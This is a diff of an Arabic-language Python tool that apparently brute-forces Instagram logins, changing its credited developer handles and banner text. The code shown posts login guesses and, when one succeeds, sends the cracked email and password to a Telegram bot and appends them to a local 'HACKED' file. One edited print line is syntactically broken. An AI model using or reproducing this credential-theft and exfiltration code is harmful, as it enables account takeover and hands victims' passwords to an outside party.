@@ -72,7 +72,7 @@ rss = requests.get(w).text
 
 if Password in rss:
     sleep(0.10)
-    print (G+"جاري الصيد برعاية سجاد 😈....")
+    print (G.")
     sleep(0.10)
     #ID = '834051745'
 
@@ -133,7 +133,7 @@ if Password in rss:
                         }
         req_login = r.post(url,headers=headers,data=data, proxies=None)
         if ("userId") in req_login.text:
-            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=🇮🇶sajad 𝒉𝒖𝒏𝒕𝒆𝒓🇮🇶  🍯 ✅\n🇮🇶➧ 𝒆𝒎𝒂𝒊𝒍 𖠨 ➦ : [→ {user} ←] \n🇮🇶 ➧ 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 ꕤ ➦ :  [→ {password} ←] \n- 𝐅𝐫𝐎𝐦 : @P4ORO - @H5QQQ ''')
+            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=🇮🇶فلاد🇮🇶  🍯 ✅\n🇮🇶➧ فلاد 𖠨 ➦ : [→ {user} ←] \n🇮🇶 ➧ فلاد ꕤ ➦ :  [→ {password} ←] \n- 𝐅𝐫𝐎𝐦 : @FLiid ''')
             i = requests.post(tlg)
             print (G+'username ==> : '+username+': password ==> : '+password)
             with open('insta.txt','a') as HACKED:
@@ -141,6 +141,6 @@ if Password in rss:
         else:
             print (E+'username ==> : '+username+': password ==> : '+password)
 else:
-    print ("نهتت الفترة المجانية راسل المطور لتفعيل ")
-    print ("معرف المطورين")
-    print ("@P4ORO\@H5QQQ")
+  
+    print ("المطور")
+    print ("@FLiid")
